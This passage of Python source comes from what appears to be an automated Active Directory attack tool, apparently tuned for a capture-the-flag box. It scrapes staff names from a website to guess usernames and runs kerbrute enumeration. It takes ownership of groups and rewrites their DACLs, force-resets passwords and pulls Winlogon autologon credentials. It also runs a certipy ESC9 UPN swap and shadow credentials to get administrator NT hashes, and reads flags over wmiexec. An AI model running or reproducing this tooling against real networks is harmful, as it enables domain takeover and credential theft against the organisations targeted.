                    import urllib.request as _ur2, re as _re_web
                    # fetch multiple pages
                    pages_to_try = [url+'/about.html', url+'/about',
                                    url+'/team', url+'/staff', url+'/people', url]
                    all_html = ''
                    page_htmls = {}
                    for page in pages_to_try:
                        try:
                            html_chunk = _ur2.urlopen(page, timeout=5, errors='replace').read().decode('utf-8',errors='ignore')
                            page_htmls[page] = html_chunk
                            log(f'Fetched {WHITE}{page}{RESET} ({len(html_chunk)} bytes)','info')
                        except Exception as _pe: pass
                    # search each page separately — don't concatenate (messes up idx search)
                    all_html = '\n'.join(page_htmls.values())

                    if not all_html:
                        log(f'Could not fetch {url}','error')
                        history.append('  webscrape: could not fetch any pages')
                    else:
                        NAME_RE = re.compile(r'^([A-Z][a-z]{1,14}) ([A-Z][a-z]{1,14})$')
                        NOT_NAMES = {
                            'About','Contact','Apply','Read','Learn','Sign','Login','Get',
                            'View','See','Find','Click','More','Info','Home','Our','New',
                            'Free','Flat','Drop','Down','Web','Bank','First','Tier',
                            'Creative','Commons','Bootstrap','Android','Smartphone','Social',
                            'Repay','Responsive','Compatible','Support','Services','Media',
                            'Fixed','Savings','Checking','Personal','Business','Online',
                            'Simple','Daily','Debit','Credit','Loan','Check','Choose',
                            'Helping','Previous','Record','Cards','Websites','Management',
                            'Expenses','Card','Your','The','And','For','With','This',
                            'Meet','Team','Amazing','Small','Wide','Range','Banking',
                            'What','Provide','Mission','Latest','Posts','Navigation',
                            'Privacy','Policy','Customer','Care','Links','Skills'
                        }
                        names = []; seen_n = set()

                        # search each page separately for team section
                        for _ph in page_htmls.values():
                            idx = _ph.find('id="team"')
                            if idx == -1: idx = _ph.find("id='team'")
                            if idx != -1:
                                search_html = _ph[idx:idx+5000]
                                log(f'Found team section — extracting names from p-tags','info')
                                p_texts = re.findall(r'<p[^>]*>\s*([^<]{3,40})\s*</p>', search_html)
                                for text in p_texts:
                                    text = text.strip()
                                    m = NAME_RE.match(text)
                                    if m:
                                        first, last = m.group(1), m.group(2)
                                        if first not in NOT_NAMES and last not in NOT_NAMES:
                                            if text not in seen_n:
                                                seen_n.add(text); names.append(text)
                                if names: break  # found names, stop searching

                        # fallback: text-mine all pages if team section not found
                        if not names:
                            log(f'{ORANGE}No team section found — trying text mining{RESET}','warn')
                            plain = re.sub(r'<[^>]+>', ' ', all_html)
                            SKIP = NOT_NAMES | {'Are','Is','In','Of','To','At','Be','It','An',
                                               'Or','Can','Has','Had','Was','Did','Not','But',
                                               'So','If','By','Do','Go','He','Me','My','No','Us'}
                            word_pairs = re.findall(r'([A-Z][a-z]{2,12}) ([A-Z][a-z]{2,12})', plain)
                            from collections import Counter as _Ctr
                            freq = _Ctr([(f,l) for f,l in word_pairs if f not in SKIP and l not in SKIP])
                            names = [f'{f} {l}' for (f,l),c in freq.most_common(10)]

                        if names:
                            log(f'{GREEN}Found {len(names)} names: {names}{RESET}','success')
                            users = []
                            ua = check_tool('username-anarchy')
                            if ua:
                                import tempfile as _tmp
                                with _tmp.NamedTemporaryFile(mode='w',suffix='.txt',delete=False) as _nf:
                                    _nf.write('\n'.join(names)); nf_path = _nf.name
                                try:
                                    ua_out = subprocess.check_output(
                                        [ua,'--input-file',nf_path,'--select-format','first,flast,first.last,firstl'],
                                        text=True, stderr=subprocess.DEVNULL, timeout=10)
                                    users = [u.strip() for u in ua_out.splitlines() if u.strip()]
                                    log(f'{GREEN}username-anarchy: {len(users)} variants{RESET}','success')
                                except Exception: pass
                                finally:
                                    try: os.remove(nf_path)
                                    except Exception: pass
                            if not users:
                                for name in names:
                                    parts = name.split()
                                    if len(parts)==2:
                                        f,l = parts[0].lower(), parts[1].lower()
                                        users += [f+'.'+l, f[0]+l, f+l[0], f+l, f[0]+'.'+l, f]
                            users = list(dict.fromkeys(users))
                            uf = os.path.join(target.loot_dir,'users.txt')
                            existing = set(open(uf, errors='replace').read().splitlines()) if os.path.exists(uf) else set()
                            new_users = [u for u in users if u not in existing]
                            if new_users:
                                with open(uf,'a') as _f: _f.write('\n'.join(new_users)+'\n')
                                log(f'{GREEN}Added {len(new_users)} usernames to users.txt{RESET}','success')
                                history.append(f'  webscrape found: {names} → {len(new_users)} usernames')
                        else:
                            history.append('  webscrape: no names found — use kerbrute with large wordlist')

                        emails = re.findall(r'[a-zA-Z0-9._%+-]+@(?!example|domain)[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', all_html)
                        if emails:
                            log(f'Found emails: {list(set(emails))[:5]}','success')
                except Exception as e:
                    log(f'Scrape failed: {e}','error')
                    history.append(f'  webscrape error: {e}')
            elif action == 'owneredit':
                # take ownership of AD object — prerequisite for dacledit
                import subprocess as _sp_oe, shutil as _sh_oe
                tool = check_tool('impacket-owneredit','owneredit.py')
                if not tool:
                    log('impacket-owneredit not found','error')
                    history.append('  owneredit: tool not found')
                else:
                    obj = params.get('target','')
                    new_owner = params.get('owner', target.user or '')
                    if target.hash:
                        auth = [f'{target.domain}/{target.user}','-hashes',f':{target.hash}']
                    else:
                        auth = [f'{target.domain}/{target.user}:{target.password}']
                    cmd = [tool,'-action','write','-new-owner',new_owner,
                           '-target',obj,'-dc-ip',target.dc] + auth
                    log(f'owneredit → {WHITE}{obj}{RESET}','info')
                    r = subprocess.run(cmd, text=True, capture_output=True)
                    if 'successfully' in r.stdout.lower():
                        log(f'{GREEN}owneredit: ownership of {obj} set to {new_owner}{RESET}','success')
                        history.append(f'  owneredit: {new_owner} owns {obj}')
                    else:
                        log(f'owneredit failed: {r.stdout[:200]}','error')
                        history.append(f'  owneredit failed: {r.stdout[:100]}')
            elif action == 'dacledit':
                tool = check_tool('dacledit.py','impacket-dacledit')
                if not tool:
                    log('impacket-dacledit not found','error')
                else:
                    obj     = params.get('target','')
                    rights  = params.get('rights','WriteMembers')
                    princ   = params.get('principal', target.user or '')
                    if target.hash:
                        auth = [f'{target.domain}/{target.user}','-hashes',f':{target.hash}']
                    else:
                        auth = [f'{target.domain}/{target.user}:{target.password}']
                    cmd = [tool,'-action','write','-rights',rights,
                           '-principal',princ,'-target',obj,'-dc-ip',target.dc] + auth
                    log(f'dacledit → {WHITE}{obj}{RESET} ({rights})','info')
                    r = subprocess.run(cmd, text=True, capture_output=True)
                    if 'successfully' in r.stdout.lower() or 'modified' in r.stdout.lower():
                        log(f'{GREEN}dacledit: {rights} granted on {obj}{RESET}','success')
                        history.append(f'  dacledit: {princ} has {rights} on {obj}')
                    else:
                        log(f'dacledit failed: {r.stdout[:200]}','error')
                        history.append(f'  dacledit failed')
            elif action == 'addmem':
                group  = params.get('group','')
                member = params.get('member', target.user or '')
                dc_h   = target.dc_fqdn or target.dc
                cmd = ['net','rpc','group','addmem',group,member,
                       '-U',f'{target.domain}/{target.user}%{target.password}',
                       '-S',dc_h]
                log(f'net rpc addmem {member} → {group}','info')
                r = subprocess.run(cmd, text=True, capture_output=True)
                # verify
                r2 = subprocess.run(['net','rpc','group','members',group,
                    '-U',f'{target.domain}/{target.user}%{target.password}','-S',dc_h],
                    text=True, capture_output=True)
                if member.split('\\')[-1].lower() in r2.stdout.lower():
                    log(f'{GREEN}{member} added to {group}{RESET}','success')
                    history.append(f'  addmem: {member} → {group}')
                else:
                    log(f'addmem failed: {r.stdout[:200]}','error')
                    history.append(f'  addmem failed: {r.stdout[:100]}')
            elif action == 'prep_group':
                # Certified chain: owneredit + dacledit + addmem in one step
                group   = params.get('group','Management')
                member  = params.get('member', target.user or '')
                oe_tool = check_tool('impacket-owneredit','owneredit.py')
                de_tool = check_tool('dacledit.py','impacket-dacledit')
                dc_h    = target.dc_fqdn or target.dc
                if target.password:
                    auth_str = f'{target.domain}/{target.user}:{target.password}'
                    auth_arr = [auth_str]
                else:
                    auth_arr = [f'{target.domain}/{target.user}','-hashes',f':{target.hash}']

                ok_oe = ok_de = ok_am = False

                # Step 1: owneredit
                if oe_tool:
                    log(f'owneredit → {WHITE}{group}{RESET}','info')
                    r = subprocess.run([oe_tool,'-action','write','-new-owner',member,
                        '-target',group,'-dc-ip',target.dc]+auth_arr,
                        text=True, capture_output=True)
                    ok_oe = 'successfully' in r.stdout.lower()
                    log(f'owneredit: {GREEN+"OK" if ok_oe else RED+"FAILED"}{RESET}','success' if ok_oe else 'error')

                # Step 2: dacledit
                if de_tool:
                    log(f'dacledit WriteMembers → {WHITE}{group}{RESET}','info')
                    r = subprocess.run([de_tool,'-action','write','-rights','WriteMembers',
                        '-principal',member,'-target',group,'-dc-ip',target.dc]+auth_arr,
                        text=True, capture_output=True)
                    ok_de = 'successfully' in r.stdout.lower() or 'modified' in r.stdout.lower()
                    log(f'dacledit: {GREEN+"OK" if ok_de else RED+"FAILED"}{RESET}','success' if ok_de else 'error')

                # Step 3: addmem
                log(f'addmem {member} → {WHITE}{group}{RESET}','info')
                if target.password:
                    subprocess.run(['net','rpc','group','addmem',group,member,
                        '-U',f'{target.domain}/{target.user}%{target.password}','-S',dc_h],
                        capture_output=True)
                r2 = subprocess.run(['net','rpc','group','members',group,
                    '-U',f'{target.domain}/{target.user}%{target.password or ""}','-S',dc_h],
                    text=True, capture_output=True)
                ok_am = member.split('\\')[-1].lower() in r2.stdout.lower() or target.user.lower() in r2.stdout.lower()
                log(f'addmem: {GREEN+"OK" if ok_am else RED+"FAILED"}{RESET}','success' if ok_am else 'error')

                if ok_am:
                    history.append(f'  prep_group: {member} now in {group} — can now shadowcred management_svc')
                    add_result('prep_group', f'{member} → {group}')
                else:
                    history.append(f'  prep_group: partially done oe={ok_oe} de={ok_de} am={ok_am}')
            elif action == 'bloody':
                # autopwn bloody — currently only resetpwd supported
                bl_action = params.get('action','resetpwd')
                bl_user   = params.get('user','')
                bl_pass   = params.get('password','Passw0rd123!')
                if bl_action == 'resetpwd' and bl_user:
                    bloody = check_tool('bloodyad','bloodyAD')
                    if not bloody:
                        log('bloodyAD not found','error')
                        history.append(f'  bloody resetpwd {bl_user}: FAILED — tool not found')
                    else:
                        # if hash-only, get a TGT first so bloodyAD can use Kerberos
                        if target.hash and not target.password:
                            getTGT = check_tool('impacket-getTGT','getTGT.py')
                            if getTGT:
                                log(f'Getting TGT for {WHITE}{target.user}{RESET} before bloodyAD...','info')
                                orig_cwd = os.getcwd()
                                os.chdir(target.loot_dir)
                                subprocess.run([getTGT, f'{target.domain}/{target.user}',
                                             '-hashes', f':{target.hash}', '-dc-ip', target.dc],
                                            capture_output=True)
                                os.chdir(orig_cwd)
                                cc = os.path.join(target.loot_dir, f'{target.user}.ccache')
                                if os.path.exists(cc):
                                    os.environ['KRB5CCNAME'] = cc
                                    log(f'TGT obtained → {WHITE}{cc}{RESET}','info')
                        if target.password:
                            ba = ['--host', target.dc_fqdn or target.dc, '-d', target.domain,
                                  '-u', target.user, '-p', target.password]
                        else:
                            ba = ['--host', target.dc_fqdn or target.dc, '-d', target.domain,
                                  '-u', target.user, '-k']
                        r = subprocess.run([bloody]+ba+['set','password',bl_user,bl_pass],
                                        text=True, capture_output=True)
                        if r.returncode == 0 or 'successfully' in (r.stdout+r.stderr).lower():
                            log(f'{GREEN}resetpwd: {WHITE}{bl_user}{GREEN} → {WHITE}{bl_pass}{RESET}','success')
                            history.append(f'  bloody resetpwd {bl_user}: OK password={bl_pass}')
                            add_result('resetpwd', f'{bl_user} → {bl_pass}')
                            track_cleanup('password_reset', f'{bl_user} password set to {bl_pass}',
                                lambda _u=bl_user, _p=bl_pass: log(
                                    f'{ORANGE}Cleanup: {WHITE}{_u}{ORANGE} password was {WHITE}{_p}{ORANGE} — reset manually{RESET}','warn'))
                            # auto-pivot to the reset user
                            log(f'Auto-pivoting to {WHITE}{bl_user}{RESET}','info')
                            target.user     = bl_user
                            target.password = bl_pass
                            target.hash     = None
                            if 'KRB5CCNAME' in os.environ: del os.environ['KRB5CCNAME']
                            add_result('pivot', f'→ {bl_user} (resetpwd)')
                        else:
                            log(f'resetpwd failed: {(r.stdout+r.stderr)[:200]}','error')
                            history.append(f'  bloody resetpwd {bl_user}: FAILED — {(r.stdout+r.stderr)[:100]}')
            elif action == 'winlogon':
                log('Checking Winlogon registry via netexec winrm...','info')
                nxc = check_tool('netexec','nxc','crackmapexec','cme')
                if not nxc:
                    log('netexec not found','error')
                elif not (target.password or target.hash):
                    log('No creds — pivot first','error')
                else:
                    dc_host = target.dc_fqdn or target.dc
                    reg_query = 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"'
                    try:
                        if target.password:
                            cmd = [nxc,'winrm',dc_host,'-u',target.user,'-p',target.password,'-x',reg_query]
                        else:
                            cmd = [nxc,'winrm',dc_host,'-u',target.user,'-H',target.hash,'-x',reg_query]
                        out = subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL, timeout=20)
                        log(f'{GREY}{out[:400]}{RESET}','info')
                        um = re.search(r'DefaultUserName\s+REG_SZ\s+(\S+)', out)
                        pm = re.search(r'DefaultPassword\s+REG_SZ\s+(\S+)', out)
                        if um and pm:
                            wlu = um.group(1).split('\\')[-1].lower()
                            wlp = pm.group(1).strip()
                            log(f'{GREEN}Winlogon autologon: {WHITE}{wlu}:{wlp}{RESET}','success')
                            cf = os.path.join(target.loot_dir,'cracked.txt')
                            with open(cf,'a') as _f: _f.write(f'{wlu}:{wlp}\n')
                            history.append(f'  winlogon found: {wlu}:{wlp} — pivot next')
                            target.user = wlu; target.password = wlp; target.hash = None
                            if 'KRB5CCNAME' in os.environ: del os.environ['KRB5CCNAME']
                            log(f'{GREEN}Auto-pivoted to {WHITE}{wlu}{RESET}','success')
                        else:
                            log('No DefaultPassword found','info')
                            history.append('  winlogon: no autologon creds found')
                    except Exception as e:
                        log(f'winlogon failed: {e}','error')
                        history.append(f'  winlogon error: {e}')

            elif action == 'flag':
                # ensure administrator hash from cracked.txt
                _cf_fl2 = os.path.join(target.loot_dir,'cracked.txt')
                if os.path.exists(_cf_fl2):
                    for _line2 in open(_cf_fl2, errors='replace').read().splitlines():
                        if ':' not in _line2: continue
                        _u2,_h2 = _line2.split(':',1)
                        if _u2.strip().lower() == 'administrator' and re.match(r'^[a-fA-F0-9]{32}$',_h2.strip()):
                            target.user = 'administrator'; target.hash = _h2.strip(); target.password = None
                            break
                # use EXACT same logic as manual 'flag' command
                TARGET.user = target.user; TARGET.hash = target.hash
                TARGET.password = target.password; TARGET.domain = target.domain
                TARGET.dc = target.dc; TARGET.dc_fqdn = target.dc_fqdn
                TARGET.loot_dir = target.loot_dir
                wmi_f = check_tool('impacket-wmiexec','wmiexec.py')
                dc_host_f = target.dc_fqdn or target.dc
                if wmi_f and target.hash:
                    auth_f = [f'{target.domain}/{target.user}@{dc_host_f}','-hashes',f':{target.hash}','-no-pass']
                    def _grab_ap(path):
                        try:
                            out = subprocess.check_output([wmi_f]+auth_f+['type '+path],
                                stderr=subprocess.DEVNULL, text=True, timeout=20)
                            m = re.search(r'[0-9a-f]{32}', out, re.I)
                            return m.group(0) if m else None
                        except Exception as e: return None
                    root_f = _grab_ap(r'C:\Users\Administrator\Desktop\root.txt')
                    if root_f:
                        history.append(f'  root flag: {root_f}')
                        root_f_val = open(os.path.join(target.loot_dir,"root.txt")).read().strip() if os.path.exists(os.path.join(target.loot_dir,"root.txt")) else "?"
                        user_f_val = open(os.path.join(target.loot_dir,"user.txt")).read().strip() if os.path.exists(os.path.join(target.loot_dir,"user.txt")) else "?"
                        _ap_parts = []
                        if user_f_val != "?": _ap_parts.append(f'user:{user_f_val[:8]}…')
                        if root_f_val != "?": _ap_parts.append(f'root:{root_f_val[:8]}…')
                        add_result('flag', '  '.join(_ap_parts) if _ap_parts else f'root:{root_f}')
                        open(os.path.join(target.loot_dir,'root.txt'),'w').write(root_f+'\n')
                    try:
                        users_f = subprocess.check_output([wmi_f]+auth_f+[r'dir C:\Users /b'],
                            stderr=subprocess.DEVNULL, text=True, timeout=15).strip().splitlines()
                        for _u3 in users_f:
                            _u3 = _u3.strip()
                            if not _u3 or _u3.lower() in ('administrator','public','default','all users'): continue
                            uf = _grab_ap(f'C:\\Users\\{_u3}\\Desktop\\user.txt')
                            if uf:
                                history.append(f'  user flag ({_u3}): {uf}')
                                open(os.path.join(target.loot_dir,'user.txt'),'w').write(uf+'\n')
                                break
                    except Exception: pass
                else:
                    log('No wmiexec or hash — cannot grab flags','error')
                done = True
            elif action == 'pivot':
                if params.get('username'): target.user = params['username']
                if params.get('password'): target.password = params['password']; target.hash = None
                if params.get('hash'): target.hash = params['hash']; target.password = None
                if 'KRB5CCNAME' in os.environ: del os.environ['KRB5CCNAME']
                log(f'{GREEN}Pivoted to {WHITE}{target.user}{RESET} / {WHITE}{target.password or "hash set"}{RESET}','success')
                history.append(f'  pivoted to {target.user}')
            elif action == 'kerbrute':
                kb = check_tool('kerbrute')
                if not kb:
                    log('kerbrute not found','error')
                    history.append('  kerbrute not found')
                else:
                    uf = os.path.join(target.loot_dir,'users.txt')
                    # always prefer generated users.txt first
                    if os.path.exists(uf) and os.path.getsize(uf) > 10:
                        wl = uf
                        n_users = sum(1 for _ in open(uf))
                        log(f'Using generated users.txt ({WHITE}{n_users} users{RESET})','info')
                    else:
                        wl = params.get('wordlist','')
                        if not wl or not os.path.exists(wl):
                            for sl in ['/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt',
                                       '/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt',
                                       '/usr/share/seclists/Usernames/Names/names.txt']:
                                if os.path.exists(sl): wl = sl; break
                        log(f'{ORANGE}users.txt empty — using {WHITE}{os.path.basename(wl)}{RESET}','warn')
                    out_f = os.path.join(target.loot_dir,'kerbrute_users.txt')
                    cmd_kb = [kb,'userenum','-d',target.domain,'--dc',target.dc,wl,'-o',out_f]
                    log(f'kerbrute userenum with {WHITE}{os.path.basename(wl)}{RESET}','info')
                    proc = subprocess.Popen(cmd_kb, stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT, text=True)
                    valid = []; hash_found = False
                    for line in proc.stdout:
                        if 'VALID USERNAME' in line:
                            m2 = re.search(r'VALID USERNAME:\s+(\S+)@', line)
                            if m2:
                                valid.append(m2.group(1))
                                print(f'  {GREEN}[+] VALID: {m2.group(1)}{RESET}')
                        elif 'no pre auth' in line or '$krb5asrep$' in line:
                            hash_found = True
                            print(f'  {GREEN}[+] HASH FOUND — stopping{RESET}')
                            proc.terminate(); break
                        else:
                            # show progress every 10k tested
                            if 'Tested' in line:
                                print(f'  {GREY}{line.rstrip()}{RESET}', end='\r')
                    proc.wait()
                    if valid:
                        uf2 = os.path.join(target.loot_dir,'users.txt')
                        ex2 = set(open(uf2, errors='replace').read().splitlines()) if os.path.exists(uf2) else set()
                        nw2 = [u for u in valid if u not in ex2]
                        if nw2:
                            with open(uf2,'a') as _f: _f.write('\n'.join(nw2)+'\n')
                        history.append(f'  kerbrute found valid users: {valid[:10]}')
                    if hash_found:
                        history.append('  Found AS-REP hash via kerbrute — crack it next!')
            elif action == 'pathfind':
                owned = params.get('owned_user', target.user or '')
                m = Pathfind(); m.answers = {'owned user': owned}; m.run(target)
            elif action == 'certipy':
                cert_action = params.get('action','find')
                if cert_action == 'esc9':
                    # ESC9: UPN swap → cert req → restore → auth
                    import subprocess as _sp_e9, re as _re_e9
                    dc_h = target.dc_fqdn or target.dc
                    ca   = params.get('ca','')
                    tmpl = params.get('template','CertifiedAuthentication')
                    mgmt_user = params.get('mgmt_user','')
                    mgmt_hash = params.get('mgmt_hash','')
                    ca_user   = params.get('ca_user','')
                    ca_hash   = params.get('ca_hash','')
                    upn_target= params.get('upn','administrator')

                    # auto-fill hashes from cracked.txt if not provided
                    cf_path = os.path.join(target.loot_dir,'cracked.txt')
                    if os.path.exists(cf_path):
                        for line in open(cf_path, errors='replace').read().splitlines():
                            if ':' not in line: continue
                            u,h = line.split(':',1)
                            u = u.strip().lower(); h = h.strip()
                            if not re.match(r'^[a-fA-F0-9]{32}$', h): continue
                            if not mgmt_hash and u in ('management_svc','mgmt_svc'):
                                mgmt_user = mgmt_user or u; mgmt_hash = h
                            if not ca_hash and u in ('ca_operator','caoperator'):
                                ca_user = ca_user or u; ca_hash = h
                    log(f'ESC9 creds: mgmt={mgmt_user}:{mgmt_hash[:8] if mgmt_hash else "?"} ca={ca_user}:{ca_hash[:8] if ca_hash else "?"}','info')

                    if not ca:
                        # try to read from certipy_find.txt
                        ff = os.path.join(target.loot_dir,'certipy_find.txt')
                        if os.path.exists(ff):
                            m_ca = re.search(r'CA Name\s*:\s*(\S+)', open(ff, errors='replace').read())
                            if m_ca: ca = m_ca.group(1)
                    if not ca:
                        log('ESC9: CA name not found — run certipy find first','error')
                        history.append('  ESC9 failed: no CA name')
                    else:
                        certipy = check_tool('certipy','certipy-ad')
                        if not certipy:
                            log('certipy not found','error')
                        else:
                            # sync clock first
                            import shutil as _sh_e9
                            if _sh_e9.which('ntpdate'):
                                subprocess.run(['sudo','-n','ntpdate',dc_h],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                            mgmt_user = mgmt_user or target.user
                            mgmt_hash = mgmt_hash or target.hash or ''
                            ca_user   = ca_user or 'ca_operator'

                            # certipy account update uses: -u user@domain -hashes :hash
                            mgmt_auth = ['-u',f'{mgmt_user}@{target.domain}',
                                         '-hashes',f':{mgmt_hash}','-dc-ip',target.dc]
                            ca_auth   = ['-u',f'{ca_user}@{target.domain}',
                                         '-hashes',f':{ca_hash}','-dc-ip',target.dc]

                            # Step 1: set UPN
                            log(f'ESC9: Setting {ca_user} UPN → {upn_target}','info')
                            r1 = subprocess.run([certipy,'account','update']+mgmt_auth+
                                ['-user',ca_user,'-upn',upn_target],
                                text=True, capture_output=True)
                            out1 = r1.stdout + r1.stderr
                            log(f'ESC9 UPN update: {out1[:200]}','info')
                            if 'Successfully' not in out1 and 'updated' not in out1.lower():
                                log(f'ESC9 UPN update failed: {out1[:300]}','error')
                                history.append('  ESC9 failed: UPN update')
                            else:
                                # Step 2: request cert as ca_operator
                                pfx_stem = 'administrator'
                                pfx_path = os.path.join(target.loot_dir, 'administrator.pfx')
                                log(f'ESC9: Requesting cert as {ca_user} via {tmpl}','info')
                                r2 = subprocess.run([certipy,'req']+ca_auth+
                                    ['-ca',ca,'-template',tmpl,'-out',pfx_stem],
                                    text=True, capture_output=True, cwd=target.loot_dir)
                                out2 = r2.stdout + r2.stderr
                                log(f'ESC9 req: {out2[:300]}','info')

                                # Step 3: restore UPN immediately (always)
                                log(f'ESC9: Restoring {ca_user} UPN','info')
                                subprocess.run([certipy,'account','update']+mgmt_auth+
                                    ['-user',ca_user,
                                     '-upn',f'{ca_user}@{target.domain}'],
                                    text=True, capture_output=True)

                                # certipy v5 saves pfx to cwd, possibly with mangled name
                                import glob as _gl_e9, shutil as _sh_e9
                                _search_dirs = [
                                    target.loot_dir,          # correct if cwd=loot_dir worked
                                    os.getcwd(),
                                    os.path.expanduser('~'),
                                    os.path.expanduser('~/HAX'),
                                ]
                                pfx_candidates = [pfx_path]
                                for _d in _search_dirs:
                                    pfx_candidates += sorted(_gl_e9.glob(os.path.join(_d,'administrator*.pfx')),
                                                             key=os.path.getmtime, reverse=True)
                                # also check cwd for mangled path names
                                pfx_candidates += sorted(_gl_e9.glob(
                                    os.path.join(os.getcwd(),'*administrator*.pfx')),
                                    key=os.path.getmtime, reverse=True)
                                actual_pfx = next((p for p in pfx_candidates if os.path.exists(p)), None)
                                if actual_pfx:
                                    log(f'Found PFX: {actual_pfx}','info')
                                # copy to loot dir with clean name
                                if actual_pfx and os.path.abspath(actual_pfx) != os.path.abspath(pfx_path):
                                    _sh_e9.copy2(actual_pfx, pfx_path)
                                    log(f'Copied PFX → {pfx_path}','info')

                                if os.path.exists(pfx_path) or actual_pfx:
                                    log(f'{GREEN}ESC9: Got administrator.pfx{RESET}','success')
                                    auth_pfx = pfx_path if os.path.exists(pfx_path) else actual_pfx
                                    # Step 4: auth
                                    r3 = subprocess.run([certipy,'auth','-pfx',auth_pfx,
                                        '-dc-ip',target.dc,'-domain',target.domain],
                                        text=True, capture_output=True, cwd=target.loot_dir)
                                    m_hash = re.search(r'Got hash.*?:([a-fA-F0-9]{32})$',
                                        r3.stdout, re.M)
                                    if m_hash:
                                        admin_hash = m_hash.group(1)
                                        log(f'{GREEN}ESC9: Administrator hash: {WHITE}{admin_hash}{RESET}','success')
                                        target.user = 'administrator'
                                        target.hash = admin_hash
                                        target.password = None
                                        history.append(f'  ESC9 success → administrator hash: {admin_hash}')
                                        add_result('esc9', f'administrator hash: {admin_hash[:8]}...')
                                        # write administrator FIRST so auto-pivot picks it up correctly
                                        cf = os.path.join(target.loot_dir,'cracked.txt')
                                        existing = open(cf, errors='replace').read() if os.path.exists(cf) else ''
                                        with open(cf,'w') as _f:
                                            _f.write(f'administrator:{admin_hash}\n')
                                            _f.write(existing)
                                        history.append('  DONE: have administrator hash — next action must be flag')
                                    else:
                                        log(f'ESC9 auth failed: {r3.stdout[:300]}','error')
                                        history.append('  ESC9 auth failed — check administrator.pfx')
                                else:
                                    log(f'ESC9 cert req: {out2[:100]}','warn')
                                    log(f'ESC9 cert req failed — no PFX found','error')
                                    history.append('  ESC9 cert request failed')
                else:
                    import subprocess as _sp_cf2, re as _re_cf2
                    certipy2 = check_tool('certipy','certipy-ad')
                    if certipy2 and cert_action == 'find':
                        # use password/hash auth directly — more reliable than Kerberos
                        dc_h2 = target.dc_fqdn or target.dc
                        if target.hash:
                            ba2 = ['-u',f'{target.user}@{target.domain}',
                                   '-hashes',f':{target.hash}','-dc-ip',target.dc,
                                   '-dc-host',dc_h2]
                        elif target.password:
                            ba2 = ['-u',f'{target.user}@{target.domain}',
                                   '-p',target.password,'-dc-ip',target.dc,
                                   '-dc-host',dc_h2]
                        else:
                            ba2 = ['-u',f'{target.user}@{target.domain}',
                                   '-dc-ip',target.dc,'-k','-no-pass','-dc-host',dc_h2]
                        find_out2 = os.path.join(target.loot_dir,'certipy_find.txt')
                        r_find = subprocess.run(
                            [certipy2,'find']+ba2+['-vulnerable','-stdout','-text'],
                            text=True, capture_output=True)
                        out_find = r_find.stdout + r_find.stderr
                        print(out_find[:3000])
                        with open(find_out2,'w') as _f: _f.write(out_find)
                        escs2 = set(re.findall(r'ESC\d+', out_find))
                        ca2 = re.search(r'CA Name\s*:\s*(\S+)', out_find)
                        tmpl2 = re.search(r'Template Name\s*:\s*(\S+)', out_find)
                        if escs2:
                            log(f'{GREEN}ADCS vulns: {escs2}{RESET}','success')
                            history.append(f'  certipy find: {escs2} CA={ca2.group(1) if ca2 else "?"} tmpl={tmpl2.group(1) if tmpl2 else "?"}')
                        else:
                            log('No vulnerable templates found as this user','warn')
                            history.append('  certipy find: no vulns — try as ca_operator')
                    else:
                        m = Certipy()
                        m.answers = {
                            'action': cert_action,
                            'target user (blank = current)': '',
                            'template': params.get('template',''),
                            'ca': params.get('ca',''),
                            'upn': params.get('upn','administrator'),
                        }
                        m.run(target)
                    if cert_action == 'find':
                        # parse ESC vulns from certipy output and save
                        find_out = os.path.join(target.loot_dir,'certipy_find.txt')
                        # copy any certipy output files to loot
                        for _cf in ['certipy_find.txt','certipy.txt']:
                            if os.path.exists(_cf):
                                import shutil as _sh_cf
                                _sh_cf.copy(_cf, find_out)
                        if os.path.exists(find_out):
                            _ftext = open(find_out, errors='replace').read()
                            _escs = re.findall(r'ESC\d+', _ftext)
                            _ca = re.search(r'CA Name\s*:\s*(\S+)', _ftext)
                            _tmpl = re.search(r'Template Name\s*:\s*(\S+)', _ftext)
                            if _escs:
                                history.append(f'  certipy find: {set(_escs)} vulns, CA={_ca.group(1) if _ca else "?"}, template={_tmpl.group(1) if _tmpl else "?"}')
                            else:
                                history.append(f'  certipy find: no ESC vulns found as {target.user}')
                        else:
                            history.append('  certipy find: completed — check loot for results')
            elif action == 'shadowcred':
                sc_target = params.get('target','')
                if not sc_target:
                    log('shadowcred: target required','error')
                    history.append('  shadowcred: no target specified')
                else:
                    import subprocess as _sp_sc, re as _re_sc, shutil as _sh_sc
                    certipy = check_tool('certipy','certipy-ad')
                    if not certipy:
                        log('certipy not found','error')
                    else:
                        dc_h = target.dc_fqdn or target.dc
                        # sync clock first
                        if _sh_sc.which('ntpdate'):
                            subprocess.run(['sudo','-n','ntpdate',dc_h],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        # build auth — certipy shadow auto uses -username/-password/-hashes flags
                        if target.hash:
                            auth = ['-username',f'{target.user}@{target.domain}',
                                    '-hashes',f':{target.hash}']
                        else:
                            auth = ['-username',f'{target.user}@{target.domain}',
                                    '-password',target.password]
                        cmd = [certipy,'shadow','auto'] + auth + [
                            '-account',sc_target,'-target',target.dc_fqdn or target.dc,'-dc-ip',target.dc]
                        log(f'shadowcred → {WHITE}{sc_target}{RESET}','info')
                        log(f'{" ".join(cmd)}','info')
                        r = subprocess.run(cmd, text=True, capture_output=True, cwd=target.loot_dir, stdin=subprocess.DEVNULL if hasattr(_sp_sc,'DEVNULL') else open(os.devnull))
                        out = r.stdout + r.stderr
                        m_hash = re.search(r'NT hash.*?:\s*([a-fA-F0-9]{32})', out)
                        if m_hash:
                            sc_hash = m_hash.group(1)
                            log(f'{GREEN}shadowcred: {sc_target} NT hash: {WHITE}{sc_hash}{RESET}','success')
                            history.append(f'  shadowcred {sc_target}: hash={sc_hash}')
                            add_result('shadowcred', f'{sc_target} NT:{sc_hash[:8]}...')
                            # save to cracked.txt
                            cf = os.path.join(target.loot_dir,'cracked.txt')
                            with open(cf,'a') as _f: _f.write(f'{sc_target}:{sc_hash}\n')
                            # save ccache
                            cc_src = f'{sc_target}.ccache'
                            if os.path.exists(cc_src):
                                import shutil as _sh2
                                _sh2.move(cc_src, os.path.join(target.loot_dir, cc_src))
                            # auto-pivot to shadowcred target
